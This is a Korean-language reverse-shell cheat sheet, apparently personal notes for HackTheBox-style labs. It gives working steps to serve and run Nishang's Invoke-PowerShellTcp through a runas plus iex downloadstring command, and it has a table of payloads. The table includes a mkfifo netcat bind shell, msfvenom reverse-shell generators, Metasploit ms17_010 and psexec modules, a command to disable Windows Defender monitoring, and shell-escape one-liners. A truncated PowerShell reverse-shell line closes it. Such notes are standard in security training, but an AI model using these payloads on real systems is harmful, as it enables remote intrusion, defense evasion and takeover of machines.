# 리버스 쉘

### Nishang 쉘 만들기 -> 웹 서버 -> 쉘 실행&#x20;

```bash
//쉘 만들기 
root@kali:/opt git clone https://github.com/samratashok/nishang.git
#nishang 쉘 가져오기, 다른 쉘도 가능 python3 등 다양한 것 시도 가능 
root@kali:/opt mkdir ~/www
root@kali:/opt cp nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/
root@kali tail Invoke-PowerShellTcp.ps1 
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
or
curl 10.10.14.27/bash #쉘 가져오기 

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443
#쉘 수정

//웹 서버 실행
root@kali python3 -m http.server 80

//쉘 실행
root@kali nc -lnvp 443

runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/Invoke-PowerShellTcp.ps1')"
#파워쉘을 이용하여 원격으로 스크립트를 다운로드하고 실행하는 명령어 
#"/user:ACCESS\Administrator": 이 부분은 명령을 실행하는 사용자 계정을 지정하는 것입니다. 
#"ACCESS\Administrator"는 사용자 계정의 도메인과 이름을 나타냅니다.
#"/savecred": 이 부분은 사용자 자격 증명을 저장하는 옵션입니다. 사용자가 한 번 자격 증명을 입력하면 이후에는 다시 입력하지 않아도 되도록 자격 증명을 저장합니다.
#"powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')": 이 부분은 PowerShell을 실행하여 웹에서 스크립트 파일을 다운로드하고 실행하는 부분입니다. 
#"iex"는 "Invoke-Expression"의 약어로, 다운로드한 스크립트를 실행하는 역할을 합니다. 
#"new-object net.webclient"는 .NET WebClient 개체를 생성하여 웹에서 파일을 다운로드하는 역할을 합니다. 
#"downloadstring('http://10.10.14.11/shell.ps1')"은 지정된 URL에서 스크립트 파일을 다운로드하는 역할을 합니다. 여기서 "http://10.10.14.11/shell.ps1"은 다운로드할 스크립트 파일의 URL을 나타냅니다.

//쉘 획득
PS C:\Windows\system32>whoami
access\administrator
```



## 쉘 업그레이드



1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. \[ctrl-Z]를 눌러 백그라운드 셸로 이동합니다.
3. `stty raw -echo; fg`
4. export TERM=xterm (or)
5. export SHELL=bash

```bash
//리버스 쉘이 작동을 안할경우
nc -lnvp (my computer)
nc 10.10.14.51 9001 (target)
해서 연결이 잘 되는지 확인 
bash -c 붙어서도 해보기

필터링이 되는 단어가 있는지 확인해보기
echo test | grep test


```



## 포탄 및 페이로드



다양한 시나리오 및 대상에 사용할 역방향 셸 및 페이로드 유형 목록:

| 도구                                                                                                  | 설명                                                                                                             |
| --------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`                                       | 원격 데스크톱 프로토콜을 사용하여 Windows 대상에 연결하는 데 사용되는 CLI 기반 도구입니다.                                                       |
| `env`                                                                                               | 다양한 명령 언어 해석기와 함께 작동하여 시스템의 환경 변수를 검색합니다. 이는 어떤 쉘 언어가 사용 중인지 알아내는 좋은 방법입니다.                                    |
| `sudo nc -lvnp <port #>`                                                                            | `netcat`지정된 포트에서 리스너를 시작합니다.                                                                                   |
| `nc -nv <ip address of computer with listener started><port being listened on>`                     | 지정된 IP 주소 및 포트에서 netcat 수신기에 연결합니다.                                                                            |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | `/bin/bash`netcat을 사용하여 지정된 IP 주소와 포트를 쉘( )에 바인딩합니다 . 이를 통해 이 명령이 실행된 컴퓨터에 연결하는 모든 사람에게 원격으로 셸 세션을 제공할 수 있습니다. |
| `Set-MpPreference -DisableRealtimeMonitoring $true`                                                 | NET에서 실시간 모니터링을 비활성화하는 데 사용하는 PowerShell 명령입니다 `Windows Defender`.                                             |
| `use exploit/windows/smb/psexec`                                                                    | `smb`취약한 Windows 시스템에서 &를 활용하여 셸 세션을 설정하는 데 사용할 수 있는 Metasploit 익스플로잇 모듈`psexec`                               |
| `shell`                                                                                             | 미터프리터 쉘 세션에서 사용되는 명령은`system shell`                                                                            |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`      | `MSFvenom`Linux 기반 리버스 쉘을 생성하는 데 사용되는 명령입니다 `stageless payload`.                                               |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`        | Windows 기반 리버스 쉘 무단계 페이로드를 생성하는 데 사용되는 MSFvenom 명령                                                             |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`    | MacOS 기반 리버스 셸 페이로드를 생성하는 데 사용되는 MSFvenom 명령                                                                   |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`  | ASP 웹 리버스 쉘 페이로드를 생성하는 데 사용되는 MSFvenom 명령                                                                      |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`       | JSP 웹 리버스 쉘 페이로드를 생성하는 데 사용되는 MSFvenom 명령                                                                      |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`       | WAR java/jsp 호환 웹 리버스 쉘 페이로드를 생성하는 데 사용되는 MSFvenom 명령                                                          |
| `use auxiliary/scanner/smb/smb_ms17_010`                                                            | 호스트가 다음에 취약한지 확인하는 데 사용되는 Metasploit 익스플로잇 모듈`ms17_010`                                                        |
| `use exploit/windows/smb/ms17_010_psexec`                                                           | ms17\_010에 취약한 Windows 기반 시스템에서 리버스 셸 세션을 얻는 데 사용되는 Metasploit 익스플로잇 모듈                                        |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`                                       | 취약한 Linux 시스템 호스팅에서 리버스 셸을 얻는 데 사용할 수 있는 Metasploit 익스플로잇 모듈`rConfig 3.9.6`                                    |
| `python -c 'import pty; pty.spawn("/bin/sh")'`                                                      | `interactive shell`Linux 기반 시스템에서 를 생성하는 데 사용되는 Python 명령                                                      |
| `/bin/sh -i`                                                                                        | Linux 기반 시스템에서 대화형 셸을 생성합니다.                                                                                   |
| `perl —e 'exec "/bin/sh";'`                                                                         | `perl`Linux 기반 시스템에서 대화형 셸을 생성하는 데 사용됩니다.                                                                      |
| `ruby: exec "/bin/sh"`                                                                              | `ruby`Linux 기반 시스템에서 대화형 셸을 생성하는 데 사용됩니다.                                                                      |
| `Lua: os.execute('/bin/sh')`                                                                        | `Lua`Linux 기반 시스템에서 대화형 셸을 생성하는 데 사용됩니다.                                                                       |
| `awk 'BEGIN {system("/bin/sh")}'`                                                                   | 명령을 사용하여 `awk`Linux 기반 시스템에서 대화형 셸을 생성합니다.                                                                     |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`                             | 명령을 사용하여 `find`Linux 기반 시스템에서 대화형 셸을 생성합니다.                                                                    |
| `find . -exec /bin/sh \; -quit`                                                                     | `find`Linux 기반 시스템에서 대화형 쉘을 생성하기 위해 명령을 사용하는 대체 방법                                                             |
| `vim -c ':!/bin/sh'`                                                                                | 텍스트 편집기를 사용하여 `VIM`대화형 쉘을 생성합니다. "감옥"을 탈출하는 데 사용할 수 있습니다.                                                      |
| `ls -la <path/to/fileorbinary>`                                                                     | `list`Linux 기반 시스템의 파일 및 디렉터리 에 사용되며 선택한 디렉터리의 각 파일에 대한 권한을 표시합니다. 실행 권한이 있는 바이너리를 찾는 데 사용할 수 있습니다.            |
| `sudo -l`                                                                                           | 현재 로그온한 사용자가 실행할 수 있는 명령을 표시합니다.`sudo`                                                                         |
| `/usr/share/webshells/laudanum`                                                                     | `laudanum webshells`ParrotOS 및 Pwnbox 의 위치                                                                     |
| `/usr/share/nishang/Antak-WebShell`                                                                 | `Antak-Webshell`Parrot OS 및 Pwnbox 의 위치                                                                        |

> `Powershell`공격 상자에서 시작된 리스너에 다시 연결하는 데 사용되는 단일 라이너입니다.

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$s
```
